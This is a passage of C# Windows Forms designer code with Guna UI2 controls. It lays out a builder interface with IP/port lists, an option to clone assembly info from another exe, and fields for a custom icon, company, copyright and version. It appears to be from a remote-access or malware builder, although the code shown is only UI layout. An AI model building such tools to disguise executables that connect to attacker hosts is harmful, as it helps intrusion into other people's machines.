		guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
		guna2ContextMenuStrip2.Size = new System.Drawing.Size(142, 40);
		toolStripMenuItem70.ForeColor = System.Drawing.Color.LightGray;
		toolStripMenuItem70.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem70.Image");
		toolStripMenuItem70.Name = "toolStripMenuItem70";
		toolStripMenuItem70.Size = new System.Drawing.Size(141, 36);
		toolStripMenuItem70.Text = "      Delete";
		toolStripMenuItem70.Click += new System.EventHandler(toolStripMenuItem70_Click);
		listBoxPort.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		listBoxPort.BorderStyle = System.Windows.Forms.BorderStyle.None;
		listBoxPort.ContextMenuStrip = guna2ContextMenuStrip2;
		guna2Transition1.SetDecoration(listBoxPort, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(listBoxPort, Guna.UI2.AnimatorNS.DecorationType.None);
		listBoxPort.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		listBoxPort.FormattingEnabled = true;
		listBoxPort.ItemHeight = 15;
		listBoxPort.Location = new System.Drawing.Point(379, 156);
		listBoxPort.Margin = new System.Windows.Forms.Padding(2, 0, 2, 2);
		listBoxPort.Name = "listBoxPort";
		listBoxPort.Size = new System.Drawing.Size(312, 90);
		listBoxPort.TabIndex = 65;
		guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
		guna2Transition2.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
		guna2PictureBox1.ImageRotate = 0f;
		guna2PictureBox1.Location = new System.Drawing.Point(861, 12);
		guna2PictureBox1.Name = "guna2PictureBox1";
		guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
		guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
		guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox1.TabIndex = 113;
		guna2PictureBox1.TabStop = false;
		guna2PictureBox1.UseTransparentBackground = true;
		guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
		btnAddIP.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnAddIP.BorderThickness = 1;
		btnAddIP.CheckedState.Parent = btnAddIP;
		btnAddIP.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnAddIP.CustomImages.Parent = btnAddIP;
		guna2Transition2.SetDecoration(btnAddIP, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnAddIP, Guna.UI2.AnimatorNS.DecorationType.None);
		btnAddIP.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnAddIP.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnAddIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnAddIP.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnAddIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnAddIP.DisabledState.Parent = btnAddIP;
		btnAddIP.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnAddIP.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAddIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnAddIP.ForeColor = System.Drawing.Color.White;
		btnAddIP.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnAddIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnAddIP.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAddIP.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnAddIP.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnAddIP.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnAddIP.HoverState.Parent = btnAddIP;
		btnAddIP.Location = new System.Drawing.Point(590, 105);
		btnAddIP.Name = "btnAddIP";
		btnAddIP.ShadowDecoration.Parent = btnAddIP;
		btnAddIP.Size = new System.Drawing.Size(101, 21);
		btnAddIP.TabIndex = 114;
		btnAddIP.Text = "Add IP/PORT";
		guna2HtmlToolTip1.SetToolTip(btnAddIP, "Add IP/Port to the list!");
		btnAddIP.Click += new System.EventHandler(BtnAddIP_Click);
		btnClone.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnClone.BorderThickness = 1;
		btnClone.CheckedState.Parent = btnClone;
		btnClone.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnClone.CustomImages.Parent = btnClone;
		guna2Transition2.SetDecoration(btnClone, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnClone, Guna.UI2.AnimatorNS.DecorationType.None);
		btnClone.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnClone.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnClone.DisabledState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnClone.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnClone.DisabledState.ForeColor = System.Drawing.Color.DimGray;
		btnClone.DisabledState.Parent = btnClone;
		btnClone.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnClone.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnClone.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnClone.ForeColor = System.Drawing.Color.White;
		btnClone.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnClone.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnClone.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnClone.HoverState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnClone.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnClone.HoverState.Parent = btnClone;
		btnClone.Location = new System.Drawing.Point(266, 375);
		btnClone.Name = "btnClone";
		btnClone.ShadowDecoration.Parent = btnClone;
		btnClone.Size = new System.Drawing.Size(182, 30);
		btnClone.TabIndex = 115;
		btnClone.Text = "Clone";
		guna2HtmlToolTip1.SetToolTip(btnClone, "Clone assembly info from other exe!");
		btnClone.Click += new System.EventHandler(BtnClone_Click);
		btnRemoveIP.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnRemoveIP.BorderThickness = 1;
		btnRemoveIP.CheckedState.Parent = btnRemoveIP;
		btnRemoveIP.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnRemoveIP.CustomImages.Parent = btnRemoveIP;
		guna2Transition2.SetDecoration(btnRemoveIP, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnRemoveIP, Guna.UI2.AnimatorNS.DecorationType.None);
		btnRemoveIP.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnRemoveIP.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnRemoveIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnRemoveIP.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnRemoveIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnRemoveIP.DisabledState.Parent = btnRemoveIP;
		btnRemoveIP.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnRemoveIP.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnRemoveIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnRemoveIP.ForeColor = System.Drawing.Color.White;
		btnRemoveIP.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnRemoveIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnRemoveIP.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnRemoveIP.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnRemoveIP.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnRemoveIP.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnRemoveIP.HoverState.Parent = btnRemoveIP;
		btnRemoveIP.Location = new System.Drawing.Point(481, 304);
		btnRemoveIP.Name = "btnRemoveIP";
		btnRemoveIP.ShadowDecoration.Parent = btnRemoveIP;
		btnRemoveIP.Size = new System.Drawing.Size(101, 21);
		btnRemoveIP.TabIndex = 116;
		btnRemoveIP.Text = "Remove IP/PORT";
		btnRemoveIP.Visible = false;
		btnRemoveIP.Click += new System.EventHandler(BtnRemoveIP_Click);
		btnAddPort.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnAddPort.BorderThickness = 1;
		btnAddPort.CheckedState.Parent = btnAddPort;
		btnAddPort.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnAddPort.CustomImages.Parent = btnAddPort;
		guna2Transition2.SetDecoration(btnAddPort, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnAddPort, Guna.UI2.AnimatorNS.DecorationType.None);
		btnAddPort.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnAddPort.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnAddPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnAddPort.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnAddPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnAddPort.DisabledState.Parent = btnAddPort;
		btnAddPort.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnAddPort.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAddPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnAddPort.ForeColor = System.Drawing.Color.White;
		btnAddPort.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnAddPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnAddPort.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAddPort.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnAddPort.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnAddPort.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnAddPort.HoverState.Parent = btnAddPort;
		btnAddPort.Location = new System.Drawing.Point(281, 304);
		btnAddPort.Name = "btnAddPort";
		btnAddPort.ShadowDecoration.Parent = btnAddPort;
		btnAddPort.Size = new System.Drawing.Size(193, 30);
		btnAddPort.TabIndex = 120;
		btnAddPort.Text = "Add Port";
		btnAddPort.Visible = false;
		btnAddPort.Click += new System.EventHandler(BtnAddPort_Click);
		btnRemovePort.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnRemovePort.BorderThickness = 1;
		btnRemovePort.CheckedState.Parent = btnRemovePort;
		btnRemovePort.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnRemovePort.CustomImages.Parent = btnRemovePort;
		guna2Transition2.SetDecoration(btnRemovePort, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnRemovePort, Guna.UI2.AnimatorNS.DecorationType.None);
		btnRemovePort.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnRemovePort.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnRemovePort.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnRemovePort.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnRemovePort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnRemovePort.DisabledState.Parent = btnRemovePort;
		btnRemovePort.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnRemovePort.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnRemovePort.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnRemovePort.ForeColor = System.Drawing.Color.White;
		btnRemovePort.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnRemovePort.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnRemovePort.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnRemovePort.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnRemovePort.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnRemovePort.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnRemovePort.HoverState.Parent = btnRemovePort;
		btnRemovePort.Location = new System.Drawing.Point(281, 342);
		btnRemovePort.Name = "btnRemovePort";
		btnRemovePort.ShadowDecoration.Parent = btnRemovePort;
		btnRemovePort.Size = new System.Drawing.Size(193, 30);
		btnRemovePort.TabIndex = 121;
		btnRemovePort.Text = "Remove Port";
		btnRemovePort.Visible = false;
		btnRemovePort.Click += new System.EventHandler(BtnRemovePort_Click);
		btnIcon.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnIcon.BorderThickness = 1;
		btnIcon.CheckedState.Parent = btnIcon;
		btnIcon.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnIcon.CustomImages.Parent = btnIcon;
		guna2Transition2.SetDecoration(btnIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		btnIcon.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnIcon.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnIcon.DisabledState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnIcon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnIcon.DisabledState.ForeColor = System.Drawing.Color.DimGray;
		btnIcon.DisabledState.Parent = btnIcon;
		btnIcon.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnIcon.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnIcon.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnIcon.ForeColor = System.Drawing.Color.White;
		btnIcon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnIcon.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnIcon.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnIcon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnIcon.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnIcon.HoverState.Parent = btnIcon;
		btnIcon.Location = new System.Drawing.Point(587, 375);
		btnIcon.Name = "btnIcon";
		btnIcon.ShadowDecoration.Parent = btnIcon;
		btnIcon.Size = new System.Drawing.Size(182, 30);
		btnIcon.TabIndex = 124;
		btnIcon.Text = "Choose Icon";
		guna2HtmlToolTip1.SetToolTip(btnIcon, "Browse for your custom icon!");
		btnIcon.Click += new System.EventHandler(BtnIcon_Click);
		guna2TabControl1.Controls.Add(tabPage1);
		guna2TabControl1.Controls.Add(tabPage2);
		guna2TabControl1.Controls.Add(tabPage3);
		guna2TabControl1.Controls.Add(tabPage4);
		guna2TabControl1.Controls.Add(tabPage5);
		guna2Transition1.SetDecoration(guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2TabControl1.ItemSize = new System.Drawing.Size(180, 40);
		guna2TabControl1.Location = new System.Drawing.Point(3, 73);
		guna2TabControl1.Name = "guna2TabControl1";
		guna2TabControl1.SelectedIndex = 0;
		guna2TabControl1.Size = new System.Drawing.Size(982, 513);
		guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
		guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.LightGray;
		guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.Transparent;
		guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.LightGray;
		guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2TabControl1.TabButtonSize = new System.Drawing.Size(180, 40);
		guna2TabControl1.TabIndex = 135;
		guna2TabControl1.TabMenuBackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
		guna2TabControl1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
		tabPage1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		tabPage1.Controls.Add(guna2Separator6);
		tabPage1.Controls.Add(guna2GroupBox5);
		tabPage1.Controls.Add(guna2GroupBox4);
		tabPage1.Controls.Add(btnIcon);
		tabPage1.Controls.Add(chkIcon);
		tabPage1.Controls.Add(btnAssembly);
		tabPage1.Controls.Add(btnClone);
		guna2Transition2.SetDecoration(tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
		tabPage1.Location = new System.Drawing.Point(4, 44);
		tabPage1.Name = "tabPage1";
		tabPage1.Padding = new System.Windows.Forms.Padding(3);
		tabPage1.Size = new System.Drawing.Size(974, 465);
		tabPage1.TabIndex = 0;
		tabPage1.Text = "Assembly";
		guna2Separator6.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator6.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator6, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator6, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator6.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator6.Location = new System.Drawing.Point(-162, -3);
		guna2Separator6.Name = "guna2Separator6";
		guna2Separator6.Size = new System.Drawing.Size(1299, 10);
		guna2Separator6.TabIndex = 137;
		guna2Separator6.UseTransparentBackground = true;
		guna2GroupBox5.BorderColor = System.Drawing.Color.FromArgb(26, 26, 26);
		guna2GroupBox5.Controls.Add(txtIcon);
		guna2GroupBox5.Controls.Add(picIcon);
		guna2GroupBox5.CustomBorderColor = System.Drawing.Color.FromArgb(27, 27, 27);
		guna2Transition2.SetDecoration(guna2GroupBox5, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2GroupBox5, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2GroupBox5.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2GroupBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2GroupBox5.ForeColor = System.Drawing.Color.LightGray;
		guna2GroupBox5.Location = new System.Drawing.Point(454, 106);
		guna2GroupBox5.Name = "guna2GroupBox5";
		guna2GroupBox5.ShadowDecoration.Parent = guna2GroupBox5;
		guna2GroupBox5.Size = new System.Drawing.Size(315, 263);
		guna2GroupBox5.TabIndex = 136;
		guna2GroupBox5.Text = "Icon Options";
		txtIcon.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtIcon.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		txtIcon.DefaultText = "";
		txtIcon.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtIcon.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtIcon.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtIcon.DisabledState.Parent = txtIcon;
		txtIcon.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtIcon.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtIcon.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtIcon.FocusedState.Parent = txtIcon;
		txtIcon.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtIcon.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtIcon.HoverState.Parent = txtIcon;
		txtIcon.Location = new System.Drawing.Point(15, 50);
		txtIcon.Name = "txtIcon";
		txtIcon.PasswordChar = '\0';
		txtIcon.PlaceholderText = "";
		txtIcon.SelectedText = "";
		txtIcon.ShadowDecoration.Parent = txtIcon;
		txtIcon.Size = new System.Drawing.Size(176, 21);
		txtIcon.TabIndex = 148;
		guna2GroupBox4.BorderColor = System.Drawing.Color.FromArgb(26, 26, 26);
		guna2GroupBox4.Controls.Add(txtFileVersion);
		guna2GroupBox4.Controls.Add(label8);
		guna2GroupBox4.Controls.Add(txtProductVersion);
		guna2GroupBox4.Controls.Add(label14);
		guna2GroupBox4.Controls.Add(txtOriginalFilename);
		guna2GroupBox4.Controls.Add(label13);
		guna2GroupBox4.Controls.Add(txtCompany);
		guna2GroupBox4.Controls.Add(label12);
		guna2GroupBox4.Controls.Add(txtCopyright);
		guna2GroupBox4.Controls.Add(label7);
		guna2GroupBox4.Controls.Add(txtTrademarks);
		guna2GroupBox4.Controls.Add(label11);
		guna2GroupBox4.Controls.Add(txtDescription);
		guna2GroupBox4.Controls.Add(label9);
		guna2GroupBox4.Controls.Add(txtProduct);
		guna2GroupBox4.Controls.Add(label10);
		guna2GroupBox4.CustomBorderColor = System.Drawing.Color.FromArgb(27, 27, 27);
		guna2Transition2.SetDecoration(guna2GroupBox4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2GroupBox4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2GroupBox4.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2GroupBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2GroupBox4.ForeColor = System.Drawing.Color.LightGray;
		guna2GroupBox4.Location = new System.Drawing.Point(130, 106);
		guna2GroupBox4.Name = "guna2GroupBox4";
		guna2GroupBox4.ShadowDecoration.Parent = guna2GroupBox4;
		guna2GroupBox4.Size = new System.Drawing.Size(318, 263);
		guna2GroupBox4.TabIndex = 135;
		guna2GroupBox4.Text = "Assembly Options";
		txtFileVersion.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtFileVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtFileVersion, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtFileVersion, Guna.UI2.AnimatorNS.DecorationType.None);
		txtFileVersion.DefaultText = "0.0.0.0";
		txtFileVersion.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtFileVersion.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtFileVersion.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtFileVersion.DisabledState.Parent = txtFileVersion;
		txtFileVersion.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtFileVersion.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtFileVersion.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtFileVersion.FocusedState.Parent = txtFileVersion;
		txtFileVersion.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtFileVersion.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtFileVersion.HoverState.Parent = txtFileVersion;
		txtFileVersion.Location = new System.Drawing.Point(124, 232);
		txtFileVersion.Name = "txtFileVersion";
		txtFileVersion.PasswordChar = '\0';
		txtFileVersion.PlaceholderText = "Username";
		txtFileVersion.SelectedText = "";
		txtFileVersion.SelectionStart = 7;
		txtFileVersion.ShadowDecoration.Parent = txtFileVersion;
		txtFileVersion.Size = new System.Drawing.Size(176, 21);
		txtFileVersion.TabIndex = 154;
		txtProductVersion.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtProductVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtProductVersion, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtProductVersion, Guna.UI2.AnimatorNS.DecorationType.None);
		txtProductVersion.DefaultText = "0.0.0.0";
		txtProductVersion.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtProductVersion.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtProductVersion.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtProductVersion.DisabledState.Parent = txtProductVersion;
		txtProductVersion.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtProductVersion.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtProductVersion.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtProductVersion.FocusedState.Parent = txtProductVersion;
		txtProductVersion.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtProductVersion.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtProductVersion.HoverState.Parent = txtProductVersion;
		txtProductVersion.Location = new System.Drawing.Point(124, 206);
		txtProductVersion.Name = "txtProductVersion";
		txtProductVersion.PasswordChar = '\0';
		txtProductVersion.PlaceholderText = "Username";
		txtProductVersion.SelectedText = "";
		txtProductVersion.SelectionStart = 7;
		txtProductVersion.ShadowDecoration.Parent = txtProductVersion;
		txtProductVersion.Size = new System.Drawing.Size(176, 21);
		txtProductVersion.TabIndex = 153;
		txtOriginalFilename.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtOriginalFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtOriginalFilename, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtOriginalFilename, Guna.UI2.AnimatorNS.DecorationType.None);
		txtOriginalFilename.DefaultText = "";
		txtOriginalFilename.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtOriginalFilename.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtOriginalFilename.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtOriginalFilename.DisabledState.Parent = txtOriginalFilename;
		txtOriginalFilename.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtOriginalFilename.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtOriginalFilename.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtOriginalFilename.FocusedState.Parent = txtOriginalFilename;
		txtOriginalFilename.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtOriginalFilename.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
